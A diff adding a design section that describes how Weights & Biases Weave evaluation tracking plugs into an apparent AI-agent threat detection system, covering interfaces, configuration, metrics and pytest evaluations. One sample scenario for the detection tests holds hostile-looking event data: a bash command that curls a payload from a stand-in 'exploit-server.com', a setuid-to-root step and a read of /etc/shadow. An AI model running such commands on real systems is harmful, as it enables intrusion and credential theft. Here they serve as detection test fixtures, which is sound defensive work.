@@ -1214,3 +1214,555 @@ The Advanced Threat Detection system employs a comprehensive testing strategy co
 - Property-based tests MUST run with at least 100 iterations in CI
 - Integration tests MUST run against real database instances
 - Performance regression tests MUST verify SLA compliance
+
+
+## Weave Integration for Evaluation Tracking and Observability
+
+### Overview
+
+The Advanced Threat Detection system integrates **Weights & Biases Weave** to provide comprehensive evaluation tracking, metrics collection, and observability for threat detection performance. Weave captures evaluation runs, tracks detection metrics (precision, recall, false positive rate, latency), and provides tracing for multi-stage attack path correlation.
+
+### Architecture Integration
+
+```mermaid
+graph TB
+    subgraph Evaluation Harness
+        EvalRunner[Evaluation Runner]
+        EvalScenarios[Evaluation Scenarios]
+        MetricsCollector[Metrics Collector]
+    end
+    
+    subgraph Weave Integration Layer
+        WeaveInit[Weave Initialization]
+        WeaveTracer[Weave Tracing]
+        WeaveMetrics[Weave Metrics]
+        WeaveDataset[Weave Dataset]
+    end
+    
+    subgraph ATD Components
+        EventCollector[EventStreamCollector]
+        AttackGraph[(Attack Graph Store)]
+        PathCorrelator[PathCorrelator]
+        SwarmDetector[AgentSwarmDetector]
+        AILMTracker[AILMTracker]
+    end
+    
+    EvalScenarios --> EvalRunner
+    EvalRunner --> WeaveInit
+    WeaveInit --> WeaveTracer
+    
+    EvalRunner --> EventCollector
+    EventCollector --> WeaveTracer
+    EventCollector --> AttackGraph
+    
+    AttackGraph --> PathCorrelator
+    AttackGraph --> SwarmDetector
+    AttackGraph --> AILMTracker
+    
+    PathCorrelator --> WeaveTracer
+    SwarmDetector --> WeaveTracer
+    AILMTracker --> WeaveTracer
+    
+    PathCorrelator --> MetricsCollector
+    SwarmDetector --> MetricsCollector
+    AILMTracker --> MetricsCollector
+    
+    MetricsCollector --> WeaveMetrics
+    EvalScenarios --> WeaveDataset
+```
+
+### Weave Components
+
+#### Component 1: WeaveEvaluationHarness
+
+**Purpose**: Orchestrates Weave initialization, manages evaluation runs, and coordinates metric collection across all ATD detection engines.
+
+**Interface**:
+```python
+from typing import Dict, List, Optional
+from dataclasses import dataclass
+import weave
+from datetime import datetime
+
+@dataclass
+class WeaveConfig:
+    project_name: str
+    entity: Optional[str] = None
+    offline_mode: bool = False
+    parallelism: int = 1
+    tags: List[str] = None
+
+class WeaveEvaluationHarness:
+    def __init__(self, config: WeaveConfig):
+        """Initialize Weave with project configuration"""
+        ...
+    
+    @weave.op()
+    async def run_evaluation(
+        self,
+        scenario_name: str,
+        events: List[NormalizedEvent],
+        expected_detections: Dict[str, Any]
+    ) -> Dict[str, Any]:
+        """Execute evaluation scenario with Weave tracking"""
+        ...
+    
+    @weave.op()
+    async def track_detection_metrics(
+        self,
+        detection_type: str,
+        true_positives: int,
+        false_positives: int,
+        false_negatives: int,
+        detection_latency_ms: float
+    ) -> Dict[str, float]:
+        """Compute and track precision, recall, F1, FPR"""
+        ...
+```
+
+**Responsibilities**:
+- Initialize Weave with project and credential management
+- Create evaluation runs with proper tagging and metadata
+- Coordinate metric collection across detection engines
+- Export evaluation results to Weave for analysis
+
+#### Component 2: WeaveTracedDetectors
+
+**Purpose**: Wraps ATD detection components with Weave tracing decorators to capture execution flows, timing, and intermediate results.
+
+**Interface**:
+```python
+class WeaveTracedPathCorrelator:
+    def __init__(self, correlator: PathCorrelator):
+        self.correlator = correlator
+    
+    @weave.op()
+    async def correlate_attack_paths(
+        self,
+        agent_id: str,
+        time_window: tuple[datetime, datetime],
+        min_path_length: int = 2
+    ) -> List[AttackPath]:
+        """Traced version of path correlation"""
+        ...
+
+class WeaveTracedSwarmDetector:
+    def __init__(self, detector: AgentSwarmDetector):
+        self.detector = detector
+    
+    @weave.op()
+    async def detect_swarms(
+        self,
+        time_window: tuple[datetime, datetime],
+        min_agents: int = 2,
+        correlation_threshold: float = 0.75
+    ) -> List[SwarmEvidence]:
+        """Traced version of swarm detection"""
+        ...
+
+class WeaveTracedAILMTracker:
+    def __init__(self, tracker: AILMTracker):
+        self.tracker = tracker
+    
+    @weave.op()
+    async def detect_permission_composition(
+        self,
+        agent_id: str,
+        time_window: tuple[datetime, datetime]
+    ) -> List[AILMEvidence]:
+        """Traced version of AILM detection"""
+        ...
+```
+
+**Responsibilities**:
+- Wrap all detection methods with `@weave.op()` decorators
+- Capture input parameters, execution time, and output results
+- Enable call graph visualization in Weave UI
+- Track multi-stage correlation flows
+
+#### Component 3: WeaveMetricsCollector
+
+**Purpose**: Collects and aggregates threat detection metrics, computing standard evaluation measures (precision, recall, F1, FPR) and custom threat-specific metrics.
+
+**Interface**:
+```python
+@dataclass
+class ThreatDetectionMetrics:
+    detection_type: str
+    precision: float
+    recall: float
+    f1_score: float
+    false_positive_rate: float
+    detection_latency_ms: float
+    true_positives: int
+    false_positives: int
+    true_negatives: int
+    false_negatives: int
+    timestamp: datetime
+
+class WeaveMetricsCollector:
+    @weave.op()
+    def compute_detection_metrics(
+        self,
+        predictions: List[bool],
+        ground_truth: List[bool],
+        latencies_ms: List[float]
+    ) -> ThreatDetectionMetrics:
+        """Compute standard classification metrics"""
+        ...
+    
+    @weave.op()
+    def compute_path_correlation_metrics(
+        self,
+        detected_paths: List[AttackPath],
+        ground_truth_paths: List[AttackPath],
+        correlation_time_ms: float
+    ) -> Dict[str, float]:
+        """Compute path correlation accuracy and latency"""
+        ...
+    
+    @weave.op()
+    def compute_swarm_detection_metrics(
+        self,
+        detected_swarms: List[SwarmEvidence],
+        ground_truth_swarms: List[SwarmEvidence],
+        detection_time_ms: float
+    ) -> Dict[str, float]:
+        """Compute swarm detection accuracy"""
+        ...
+    
+    @weave.op()
+    def export_metrics_to_weave(
+        self,
+        metrics: List[ThreatDetectionMetrics],
+        run_name: str
+    ) -> None:
+        """Export aggregated metrics to Weave"""
+        ...
+```
+
+**Responsibilities**:
+- Compute precision, recall, F1 score, false positive rate
+- Track detection latency per threat type
+- Aggregate metrics across evaluation scenarios
+- Export metrics to Weave for visualization and comparison
+
+### Configuration and Environment Variables
+
+#### Required Environment Variables
+
+```python
+# Weave Authentication
+WANDB_API_KEY = "your_wandb_api_key"  # Required for Weave access
+
+# Weave Project Configuration
+WEAVE_PROJECT_NAME = "blackwall-advanced-threat-detection"
+WEAVE_ENTITY = "your_wandb_entity"  # Optional, defaults to personal entity
+
+# Weave Operational Settings
+WEAVE_OFFLINE = "false"  # Set to "true" for offline mode (no W&B sync)
+WEAVE_PARALLELISM = "10"  # Parallel evaluation workers (1-10)
+WEAVE_DISABLED = "false"  # Set to "true" to completely disable Weave
+
+# Evaluation Environment
+EVAL_ENVIRONMENT = "test"  # test, staging, production
+EVAL_RUN_ID = "auto"  # Auto-generated or manual run ID
+```
+
+#### Configuration File Format
+
+```yaml
+# .kiro/evals/weave_config.yaml
+weave:
+  project_name: "blackwall-advanced-threat-detection"
+  entity: null  # Defaults to user entity
+  offline_mode: false
+  parallelism: 10
+  
+evaluation:
+  scenarios_dir: "tests/evals/scenarios/"
+  metrics_export_interval_seconds: 60
+  
+detection_engines:
+  path_correlator:
+    trace_enabled: true
+    metrics_enabled: true
+  swarm_detector:
+    trace_enabled: true
+    metrics_enabled: true
+  ailm_tracker:
+    trace_enabled: true
+    metrics_enabled: true
+  exploit_chain_analyzer:
+    trace_enabled: true
+    metrics_enabled: true
+  c2_detector:
+    trace_enabled: true
+    metrics_enabled: true
+  k8s_defense:
+    trace_enabled: true
+    metrics_enabled: true
+  registry_monitor:
+    trace_enabled: true
+    metrics_enabled: true
+```
+
+### Integration Points with Existing Components
+
+#### EventStreamCollector Integration
+
+```python
+class WeaveTracedEventStreamCollector(EventStreamCollector):
+    @weave.op()
+    async def collect_from_kernel(self) -> AsyncIterator[NormalizedEvent]:
+        """Traced kernel event collection"""
+        async for event in super().collect_from_kernel():
+            yield event
+    
+    @weave.op()
+    async def collect_from_tool_intercepts(self) -> AsyncIterator[NormalizedEvent]:
+        """Traced tool intercept collection"""
+        async for event in super().collect_from_tool_intercepts():
+            yield event
+```
+
+#### AttackGraphStore Integration
+
+```python
+class WeaveTracedAttackGraphStore(AttackGraphStore):
+    @weave.op()
+    async def insert_event(self, event: NormalizedEvent) -> AttackNode:
+        """Traced event insertion"""
+        return await super().insert_event(event)
+    
+    @weave.op()
+    async def query_paths(
+        self,
+        agent_id: str,
+        time_window: tuple[datetime, datetime],
+        min_path_length: int = 2
+    ) -> List[AttackPath]:
+        """Traced path query with latency tracking"""
+        import time
+        start = time.perf_counter()
+        paths = await super().query_paths(agent_id, time_window, min_path_length)
+        elapsed_ms = (time.perf_counter() - start) * 1000
+        weave.log({"query_latency_ms": elapsed_ms, "paths_found": len(paths)})
+        return paths
+```
+
+### Evaluation Scenarios with Weave Datasets
+
+#### Weave Dataset Creation
+
+```python
+import weave
+
+# Create evaluation dataset from scenario files
+@weave.op()
+def create_evaluation_dataset(scenario_dir: str) -> weave.Dataset:
+    scenarios = []
+    for scenario_file in Path(scenario_dir).glob("*.yaml"):
+        with open(scenario_file) as f:
+            scenario = yaml.safe_load(f)
+            scenarios.append({
+                "name": scenario["name"],
+                "events": scenario["events"],
+                "expected_detections": scenario["expected_detections"]
+            })
+    
+    return weave.Dataset(
+        name="atd-evaluation-scenarios",
+        rows=scenarios
+    )
+```
+
+#### Example Evaluation Scenario Format
+
+```yaml
+# tests/evals/scenarios/multi_stage_attack.yaml
+name: "Multi-Stage RCE to Credential Theft"
+description: "Agent executes RCE, escalates privileges, steals credentials"
+
+events:
+  - event_id: "evt-001"
+    timestamp: "2026-01-15T10:00:00Z"
+    source: "KERNEL_SYSCALL"
+    agent_id: "agent-malicious-001"
+    action: "execve"
+    target: "/bin/bash -c 'curl exploit-server.com/payload.sh'"
+    risk_score: 0.85
+  
+  - event_id: "evt-002"
+    timestamp: "2026-01-15T10:00:15Z"
+    source: "KERNEL_SYSCALL"
+    agent_id: "agent-malicious-001"
+    action: "setuid"
+    target: "0"
+    risk_score: 0.95
+  
+  - event_id: "evt-003"
+    timestamp: "2026-01-15T10:00:30Z"
+    source: "IDENTITY_ACCESS"
+    agent_id: "agent-malicious-001"
+    action: "read_credentials"
+    target: "/etc/shadow"
+    risk_score: 0.98
+
+expected_detections:
+  attack_path:
+    detected: true
+    min_nodes: 3
+    attack_stages: ["T1059.004", "T1068", "T1003.008"]
+    min_risk_score: 0.85
+  
+  exploit_chain:
+    detected: true
+    chain_sequence: ["RCE", "PRIVILEGE_ESCALATION", "CREDENTIAL_THEFT"]
+    min_novelty_score: 0.0
+  
+  ailm:
+    detected: true
+    boundary_crossings: ["user", "root"]
+    min_risk_level: "HIGH"
+```
+
+### Metrics Tracked by Weave
+
+#### Detection Performance Metrics
+
+| Metric | Description | Target |
+|--------|-------------|--------|
+| `precision` | TP / (TP + FP) | ≥ 0.95 |
+| `recall` | TP / (TP + FN) | ≥ 0.90 |
+| `f1_score` | 2 * (precision * recall) / (precision + recall) | ≥ 0.92 |
+| `false_positive_rate` | FP / (FP + TN) | ≤ 0.05 |
+| `detection_latency_ms` | Time from event to detection | ≤ 100 ms |
+
+#### Component-Specific Metrics
+
+**PathCorrelator Metrics**:
+- `path_correlation_accuracy`: Percentage of correctly identified attack paths
+- `path_correlation_latency_ms`: Time to correlate paths
+- `false_path_rate`: Percentage of incorrectly correlated paths
+
+**AgentSwarmDetector Metrics**:
+- `swarm_detection_accuracy`: Percentage of correctly identified swarms
+- `swarm_detection_latency_ms`: Time to detect swarms
+- `false_swarm_rate`: Percentage of false swarm detections
+
+**AILMTracker Metrics**:
+- `ailm_detection_accuracy`: Percentage of correctly identified AILM events
+- `ailm_detection_latency_ms`: Time to detect lateral movement
+- `boundary_crossing_accuracy`: Percentage of correctly identified boundary crossings
+
+**ExploitChainAnalyzer Metrics**:
+- `exploit_chain_accuracy`: Percentage of correctly identified exploit chains
+- `novelty_score_accuracy`: Accuracy of novelty scoring
+- `zero_day_detection_rate`: Percentage of detected zero-day patterns
+
+### Pytest Integration with Weave
+
+#### Evaluation Test Structure
+
+```python
+# tests/evals/test_atd_weave_evaluations.py
+import pytest
+import weave
+from blackwall.enterprise.advanced_threat_detection.weave_harness import (
+    WeaveEvaluationHarness,
+    WeaveConfig
+)
+
+@pytest.fixture
+def weave_harness():
+    config = WeaveConfig(
+        project_name="blackwall-atd",
+        offline_mode=os.getenv("WEAVE_OFFLINE") == "true",
+        parallelism=int(os.getenv("WEAVE_PARALLELISM", "1"))
+    )
+    return WeaveEvaluationHarness(config)
+
+@pytest.mark.asyncio
+@pytest.mark.weave
+async def test_eval_multi_stage_attack_detection(weave_harness):
+    """Evaluate multi-stage attack path detection with Weave tracking"""
+    scenario = load_scenario("multi_stage_attack.yaml")
+    
+    result = await weave_harness.run_evaluation(
+        scenario_name="multi_stage_attack",
+        events=scenario["events"],
+        expected_detections=scenario["expected_detections"]
+    )
+    
+    assert result["attack_path"]["detected"] == True
+    assert result["metrics"]["precision"] >= 0.95
+    assert result["metrics"]["recall"] >= 0.90
+
+@pytest.mark.asyncio
+@pytest.mark.weave
+async def test_eval_agent_swarm_detection(weave_harness):
+    """Evaluate agent swarm detection with Weave tracking"""
+    scenario = load_scenario("agent_swarm.yaml")
+    
+    result = await weave_harness.run_evaluation(
+        scenario_name="agent_swarm",
+        events=scenario["events"],
+        expected_detections=scenario["expected_detections"]
+    )
+    
+    assert result["swarm"]["detected"] == True
+    assert result["metrics"]["false_positive_rate"] <= 0.05
+```
+
+### Backward Compatibility
+
+The Weave integration maintains full backward compatibility with the existing pytest-based evaluation infrastructure:
+
+1. **Optional Weave Activation**: Weave tracing is activated only when `WANDB_API_KEY` is present or `@pytest.mark.weave` decorator is used
+2. **Fallback to Standard Pytest**: Tests run normally without Weave if credentials are unavailable
+3. **Existing Test Preservation**: All existing unit, integration, and property tests continue to work unchanged
+4. **Progressive Enhancement**: Weave features are additive and don't break existing workflows
+
+#### Compatibility Implementation
+
+```python
+# Automatic Weave detection and graceful degradation
+def should_enable_weave() -> bool:
+    """Check if Weave should be enabled based on environment"""
+    if os.getenv("WEAVE_DISABLED") == "true":
+        return False
+    if os.getenv("WANDB_API_KEY"):
+        return True
+    # Check for netrc or config file credentials
+    return has_wandb_credentials()
+
+# Conditional decorator application
+def weave_op_if_enabled(func):
+    """Apply @weave.op() only if Weave is enabled"""
+    if should_enable_weave():
+        return weave.op()(func)
+    return func
+```
+
+## Dependencies
+
+### Core Dependencies
+- **Python**: >= 3.11
+- **asyncpg**: PostgreSQL async driver
+- **TimescaleDB**: Time-series optimization for PostgreSQL
+- **Pydantic**: Data validation and settings management
+- **pytest**: Testing framework
+- **pytest-asyncio**: Async test support
+- **pytest-bdd**: Behavior-driven development tests
+- **Hypothesis**: Property-based testing
+
+### Weave Integration Dependencies
+- **weave**: >= 0.50.0 - W&B Weave for evaluation tracking
+- **wandb**: >= 0.16.0 - Weights & Biases SDK for authentication
+- **pyyaml**: >= 6.0 - YAML scenario parsing
+
+### External Services
+- **Weights & Biases**: Cloud-based evaluation tracking (optional, supports offline mode)
+- **PostgreSQL with TimescaleDB**: Graph storage and time-series queries
+- **Existing Blackwall Pillars**: Event sources (Kernel, Threat Mesh, Identity, Pipeline, Forensics)
